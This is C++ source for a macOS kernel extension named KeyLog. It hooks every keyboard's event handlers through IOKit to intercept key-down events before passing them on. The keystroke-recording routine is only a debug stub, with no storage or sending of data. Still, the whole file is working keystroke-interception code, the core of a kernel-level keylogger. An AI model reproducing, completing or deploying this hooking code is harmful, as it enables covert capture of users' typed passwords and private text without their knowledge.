/* add your code here */

#include <IOKit/IOLib.h>
#include "KeyLog.h"

com_prebeg_kext_KeyLog           *logService;
KeyboardEventAction                     origAction;
KeyboardSpecialEventAction      origSpecialAction;

// This required macro defines the class's constructors, destructors,
// and several other methods I/O Kit requires.
OSDefineMetaClassAndStructors(com_prebeg_kext_KeyLog, IOService)

// Define the driver's superclass.
#define super IOService

void specialAction(OSObject * target,
                   /* eventType */        unsigned   eventType,
                   /* flags */            unsigned   flags,
                   /* keyCode */          unsigned   key,
                   /* specialty */        unsigned   flavor,
                   /* source id */        UInt64     guid,
                   /* repeat */           bool       repeat,
                   /* atTime */           AbsoluteTime ts)
{
    if ((eventType==NX_SYSDEFINED)&&(!flags)&&(key==NX_NOSPECIALKEY))       // only sign of a logout (also thrown when sleeping)
        logService->clearKeyboards();
    
    if (origSpecialAction)
        (*origSpecialAction)(target,eventType,flags,key,flavor,guid,repeat,ts);
}

void logAction(OSObject * target,
               /* eventFlags  */      unsigned   eventType,
               /* flags */            unsigned   flags,
               /* keyCode */          unsigned   key,
               /* charCode */         unsigned   charCode,
               /* charSet */          unsigned   charSet,
               /* originalCharCode */ unsigned   origCharCode,
               /* originalCharSet */  unsigned   origCharSet,
               /* keyboardType */     unsigned   keyboardType,
               /* repeat */           bool       repeat,
               /* atTime */           AbsoluteTime ts)
{
    if ((eventType==NX_KEYDOWN)&&logService)
        logService->logStroke(key, flags, charCode);
    if (origAction)
        (*origAction)(target,eventType,flags,key,charCode,charSet,origCharCode,origCharSet,keyboardType,repeat,ts);
}

void com_prebeg_kext_KeyLog::logStroke( unsigned key, unsigned flags, unsigned charCode )
{
    
#ifdef DEBUG
    IOLog( "%s::Copying key %04x\n", getName(), key );
#endif
    
}

bool com_prebeg_kext_KeyLog::init(OSDictionary *dict)
{
    bool result = super::init(dict);
    IOLog("Initializing\n");
    
    origAction = NULL;
    origSpecialAction = NULL;
    
    kextKeys = 0;
    logService = this;
    
    loggedKeyboards = new OSArray();
    loggedKeyboards->initWithCapacity(1);
    
    return result;
}

void com_prebeg_kext_KeyLog::free(void)
{
    IOLog("Freeing\n");
    super::free();
}

IOService *com_prebeg_kext_KeyLog::probe(IOService *provider,
                                                SInt32 *score)
{
    IOService *result = super::probe(provider, score);
    IOLog("Probing\n");
    return result;
}

bool com_prebeg_kext_KeyLog::notificationHandler(void *target, void *ref, IOService *newServ, IONotifier *notifier)
{
    com_prebeg_kext_KeyLog* self = OSDynamicCast( com_prebeg_kext_KeyLog, (OSMetaClassBase*)target );
    if (!self)
        return false;
    
#ifdef DEBUG
    IOLog( "%s::Notification handler called\n", self->getName() );
#endif
    
    IOHIKeyboard*   keyboard = OSDynamicCast( IOHIKeyboard, newServ );
    if (!keyboard)
        return false;
    
    if (!keyboard->_keyboardEventTarget)
    {
#ifdef DEBUG
        IOLog( "%s::No Keyboard event target\n", self->getName());
#endif
        
        return false;
    }
    // event target must be IOHIDSystem
    
    IOService*      targetServ = OSDynamicCast( IOService, keyboard->_keyboardEventTarget );
    if (targetServ)
    {
#ifdef DEBUG
        IOLog( "%s::Keyboard event target is %s\n", self->getName(), targetServ->getName());
#endif
    }
    
    if (!keyboard->_keyboardEventTarget->metaCast("IOHIDSystem"))
        return false;

    // we have a valid keyboard to be logged
#ifdef DEBUG
    IOLog( "%s::Adding keyboard %x\n", self->getName(),keyboard );
#endif
    
    
    int index = self->loggedKeyboards->getNextIndexOfObject(keyboard,0);
    if (index<0)
    {       
        self->loggedKeyboards->setObject(keyboard);
        self->kextKeys++;
    }
    
    origAction = keyboard->_keyboardEventAction;            // save the original action
    keyboard->_keyboardEventAction = (KeyboardEventAction) logAction;       // apply the new action
    
    origSpecialAction = keyboard->_keyboardSpecialEventAction;              // save the original action
    keyboard->_keyboardSpecialEventAction = (KeyboardSpecialEventAction) specialAction;     // apply the new action
    
    return true;
}

void com_prebeg_kext_KeyLog::clearKeyboards()
{
#ifdef DEBUG
    IOLog( "%s::Clear keyboards called with kextkeys %d!\n", getName(), kextKeys );
#endif
    
    if (loggedKeyboards)
    {
        int arraySize = loggedKeyboards->getCount();
        for (int i=0; i<arraySize; i++)
        {
            IOHIKeyboard *curKeyboard = (IOHIKeyboard*)loggedKeyboards->getObject(0);
            
            if (origSpecialAction)
                curKeyboard->_keyboardSpecialEventAction = origSpecialAction;
            if (origAction)
                curKeyboard->_keyboardEventAction = origAction;
            
            loggedKeyboards->removeObject(0);
            kextKeys--;
        }
    }
    origSpecialAction = NULL;
    origAction = NULL;
    kextKeys=0;
}

bool com_prebeg_kext_KeyLog::start(IOService *provider)
{
    bool result = super::start(provider);
    IOLog("Starting\n");
    
    addMatchingNotification(gIOPublishNotification, serviceMatching("IOHIKeyboard"), (IOServiceMatchingNotificationHandler)&com_prebeg_kext_KeyLog::notificationHandler, this);
    
    return result;
}

void com_prebeg_kext_KeyLog::stop(IOService *provider)
{
    IOLog("Stopping\n");
    super::stop(provider);
}

